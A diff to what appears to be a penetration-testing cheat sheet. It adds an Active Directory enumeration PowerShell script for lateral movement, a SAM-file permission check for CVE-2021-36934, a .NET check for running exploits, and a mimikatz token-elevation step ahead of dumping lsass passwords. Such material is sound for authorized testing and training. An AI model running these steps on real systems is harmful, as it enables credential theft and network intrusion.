@@ -89,6 +89,8 @@ Other great cheetsheets:
     - [5.7.3. Windows Service Escalation - Registry](#573-windows-service-escalation---registry)
   - [5.8. Compiling Windows Binaries on Linux](#58-compiling-windows-binaries-on-linux)
   - [5.9. Miscellaneous Windows Commands](#59-miscellaneous-windows-commands)
+  - [5.10. Lateral Movement in Windows Active Directory](#510-lateral-movement-in-windows-active-directory)
+    - [5.10.1. Quick Active Directory Enumeration](#5101-quick-active-directory-enumeration)
 - [6. Linux Privilege Escalation](#6-linux-privilege-escalation)
   - [6.1. Basic Linux Post-Exploit Enumeration](#61-basic-linux-post-exploit-enumeration)
   - [6.2. Watching for Linux Process Changes](#62-watching-for-linux-process-changes)
@@ -354,7 +356,7 @@ whatweb -v -a3 $VICTIM_IP
 ```sh
 # Gobuster
 ulimit -n 8192 # prevent file access error during scanning
-gobuster dir -ezqrkw /usr/share/dirb/wordlists/common.txt -t 100 -x "txt,htm,html,php,asp,aspx,jsp,cgi" -o gobuster-common.txt -u http://$VICTIM_IP:8080
+gobuster dir -ezqrkw /usr/share/dirb/wordlists/common.txt -t 100 -x "txt,htm,html,php,asp,aspx,jsp,cgi" -o gobuster-common.txt -u http://$VICTIM_IP
 # -e / --expanded = Expanded mode, print full URLs (easy for clicking to open)
 # -z / --no-progress = no progress displayed
 # -q / --quiet = quiet mode (no banner)
@@ -1360,6 +1362,9 @@ icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 :: look for (F), full access, or (W), write access
 :: exploit by dropping reverse shell exe there, wait for admin to log in.
 
+:: Do we have access to the SAM database? CVE-2021-36934, https://www.kb.cert.org/vuls/id/506989
+icacls %windir%\system32\config\sam
+
 :: Files of interest (consider pulling for loot)
 type %SYSTEMDRIVE%\boot.ini
 type %WINDIR%\win.ini
@@ -1411,6 +1416,9 @@ dir /b/a:d "Program files" "program Files (x86)" | sort
 wmic product get name,version
 powershell -c "Get-WmiObject -Class Win32_Product | Select-Object -Property Name,Version"
 powershell -c "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize"
+
+:: Determine .NET version on machine (useful for running C# exploits)
+dir C:\windows\microsoft.net\framework\
 
 :: check if PowerShell logging is enabled
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
@@ -1813,6 +1821,51 @@ Add-Type -A 'System.IO.Compression.FileSystem';
 
 # Zip a directory using Powershell 5.0 (Win10)
 Compress-Archive -Path 'C:\folder' -DestinationPath 'C:\output.zip'
+```
+
+## 5.10. Lateral Movement in Windows Active Directory
+
+### 5.10.1. Quick Active Directory Enumeration
+
+This script will provide a quick listing of all computers, users, service
+accounts, groups and memberships on an Active Directory domain.
+
+This script was written by Cones, modifying the example code provided in the
+PWK course materials.
+
+```powershell
+$d=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();
+$q=("LDAP://"+($d.PdcRoleOwner).Name+"/DC="+($d.Name.Replace('.',',DC=')));
+$s=New-Object System.DirectoryServices.DirectorySearcher([ADSI]$q);
+$s.SearchRoot=(New-Object System.DirectoryServices.DirectoryEntry);
+write-host "-- COMPUTERS --";
+$s.filter="(objectCategory=computer)";$s.FindAll()|?{write-host $_.Path};
+write-host "-- USERS --";
+$s.filter="(objectCategory=person)";$s.FindAll()|?{write-host $_.Path};
+write-host "-- SERVICES --";
+$s.filter="(serviceprincipalname=*)";$s.FindAll()|?{write-host $_.Path};
+write-host "-- GROUPS --";
+$s.filter="(objectCategory=group)";$s.FindAll()|?{write-host $_.Path};
+write-host "-- MEMBERSHIP --";
+function _r {
+  param($o,$m);
+  if ($o.Properties.member -ne $null) {
+    $lm=[System.Collections.ArrayList]@();
+    $o.Properties.member|?{$lm.add($_.split(",")[0].replace("CN=",""))};
+    $lm=$lm|select -unique;
+    $m.add((New-Object psobject -Property @{
+      OU = $o.Properties.name[0]
+      M = [string]::Join(", ",$lm)
+    }));
+    $lm | ?{
+      $s.filter=[string]::Format("(name={0})",$_);
+      $s.FindAll()|?{_r $_ $m | out-null};
+    }
+  }
+}
+$m=[System.Collections.ArrayList]@();
+$s.FindAll()|?{_r $_ $m | out-null};
+$m|sort-object OU -unique|?{write-host ([string]::Format("[OU] {0}: {1}",$_.OU,$_.M))};
 ```
 
 # 6. Linux Privilege Escalation
@@ -2561,6 +2614,8 @@ impacket-secretsdump -just-dc-ntlm -outputfile secretsdump DOMAIN/username:Passw
 .\mimikatz.exe
 :: enable full debug privileges to have access to system memory
 privilege::debug
+:: elevate to system
+token::elevate
 :: get hashes and try to print plaintext passwords
 sekurlsa::logonpasswords
 :: tries to extract plaintext passwords from lsass memory
